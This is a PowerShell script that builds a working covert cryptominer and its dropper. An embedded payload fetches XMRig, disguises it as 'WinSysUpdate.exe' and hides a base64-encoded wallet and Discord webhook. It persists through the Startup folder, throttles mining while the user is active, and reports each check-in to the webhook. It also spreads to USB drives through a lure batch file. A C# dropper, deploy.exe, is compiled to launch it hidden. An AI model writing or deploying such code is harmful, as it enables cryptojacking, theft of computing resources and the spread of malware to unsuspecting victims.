$minerPs1 = @"
`$b64 = `"MHg3ZDBCMDI5Zjk2MzQ4ODk2RWRhQzMxOTgwMTQ5Njg2MWM4ODhiQTE0`"
`$wallet = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$b64))
`$url = `"https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip`"
# Webhook de Monitoramento
`$m64 = `"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4OTY5NDI0Nzg0OTQyNjk2NC8tUFVnSmwxRWJ4MHJ2Ql9yOTRtLXNCREQzZV9Id3dsRWtJVHN3ZzFuc3ZzcEZxanBUQ0tFZktmOTF4c2Z3Yjk5RXNFRw==`"
`$monitorUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$m64))

`$tempBase = `"`$env:LOCALAPPDATA\WinSysUpdate`"
`$dir = `"`$tempBase\bin`"
`$logFile = `"`$tempBase\sys_log.txt`"
`$newPath = Join-Path `$dir `"WinSysUpdate.exe`"

function Send-Checkin {
    param(`$status)
    try {
        `$body = @{
            content = `"🔔 **Check-in Minerador**\`n💻 **Host:** `$env:COMPUTERNAME\`n🛠 **Status:** `$status\`n📈 **Modo:** `$mode\`n📅 **Data:** `$(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')`"
        } | ConvertTo-Json
        Invoke-RestMethod -Uri `$monitorUrl -Method Post -Body `$body -ContentType `"application/json`"
    } catch {}
}

# 1. Persistencia
`$startupFolder = `"`$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup`"
`$shortcutPath = `"`$startupFolder\WinSysUpdate.vbs`"
if (-not (Test-Path `$shortcutPath)) {
    `$vbsContent = `"CreateObject(`\`"Wscript.Shell`\`").Run `\`"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `\`"`\`" + `\`"`$PSCommandPath`\`" + `\`"`\`"`\`", 0, False`"
    Set-Content -Path `$shortcutPath -Value `$vbsContent
}

# 2. Download
if (-not (Test-Path `$dir)) {
    New-Item -ItemType Directory -Path `$dir -Force | Out-Null
    `$zip = `"`$tempBase\update.zip`"
    Invoke-WebRequest -Uri `$url -OutFile `$zip
    Expand-Archive -Path `$zip -DestinationPath `$dir -Force
    Remove-Item `$zip
}

`$xmrigOrig = Get-ChildItem -Path `$dir -Filter xmrig.exe -Recurse | Select-Object -First 1
if (`$xmrigOrig -and -not (Test-Path `$newPath)) {
    Move-Item `$xmrigOrig.FullName `$newPath -Force
}

Add-Type -TypeDefinition @`"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(`"user32.dll`")]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    [StructLayout(LayoutKind.Sequential)]
    public struct LASTINPUTINFO {
        public uint cbSize;
        public uint dwTime;
    }
}
`"@

function Get-IdleTime {
    `$lii = New-Object Win32+LASTINPUTINFO
    `$lii.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf(`$lii)
    if ([Win32]::GetLastInputInfo([ref]`$lii)) {
        return ([Environment]::TickCount - `$lii.dwTime) / 1000
    }
    return 0
}

`$mode = `"none`"
Send-Checkin `"Iniciado`"

while (`$true) {
    `$idleTime = Get-IdleTime
    `$isUserActive = `$idleTime -lt 30

    if (`$isUserActive -and `$mode -ne `"active`") {
        Stop-Process -Name `"WinSysUpdate`" -ErrorAction SilentlyContinue
        `$args = `"-o rx.unmineable.com:3333 -u MATIC:`$(`$wallet).srv01#p0o1-l2m3 -p x -a rx/0 --cpu-max-threads-hint 25 --priority 1 --log-file \`"`$logFile\`"`"
        Start-Process -FilePath `$newPath -ArgumentList `$args -WindowStyle Hidden
        `$mode = `"active`"
        Send-Checkin `"Modo Baixo Consumo (Usuario Ativo)`"
    } 
    elseif (-not `$isUserActive -and `$mode -ne `"idle`") {
        Stop-Process -Name `"WinSysUpdate`" -ErrorAction SilentlyContinue
        `$args = `"-o rx.unmineable.com:3333 -u MATIC:`$(`$wallet).srv01#p0o1-l2m3 -p x -a rx/0 --cpu-max-threads-hint 100 --priority 5 --randomx-1gb-pages --cuda --opencl --log-file \`"`$logFile\`"`"
        Start-Process -FilePath `$newPath -ArgumentList `$args -WindowStyle Hidden
        `$mode = `"idle`"
        Send-Checkin `"Modo Full Power (Usuario Ocioso)`"
    }

    # 4. Propagacao USB
    `$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { (Get-Volume -DriveLetter `$_.Name).DriveType -eq 2 }
    foreach (`$d in `$drives) {
        `$dest = Join-Path (`$d.Root) `"SystemUpdate`"
        if (-not (Test-Path `$dest)) {
            New-Item -ItemType Directory -Path `$dest -Force | Out-Null
            Copy-Item -Path (Split-Path `$PSCommandPath) -Destination `$dest -Recurse -Force -ErrorAction SilentlyContinue
            `$bat = `"@echo off\`r\`npowershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"%~dp0miner.ps1\`"\`r\`nexit`"
            Set-Content -Path (Join-Path `$d.Root `"Abrir_Arquivos.bat`") -Value `$bat
        }
    }

    Start-Sleep -Seconds 300
}
"@

$minerPs1Base64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($minerPs1))

$csharpCode = @"
using System;
using System.IO;
using System.Diagnostics;
using System.Text;

public class Program {
    public static void Main() {
        string tempDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WinSysUpdate");
        if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
        
        string psFile = Path.Combine(tempDir, "miner.ps1");
        string minerCode = Encoding.UTF8.GetString(Convert.FromBase64String("$minerPs1Base64"));
        File.WriteAllText(psFile, minerCode);
        
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "powershell.exe";
        psi.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File \"" + psFile + "\"";
        psi.CreateNoWindow = true;
        psi.UseShellExecute = false;
        psi.WindowStyle = ProcessWindowStyle.Hidden;
        
        Process.Start(psi);
    }
}
"@

Add-Type -TypeDefinition $csharpCode -OutputAssembly "c:\Users\mkaua\Desktop\cript\deploy.exe" -OutputType ConsoleApplication
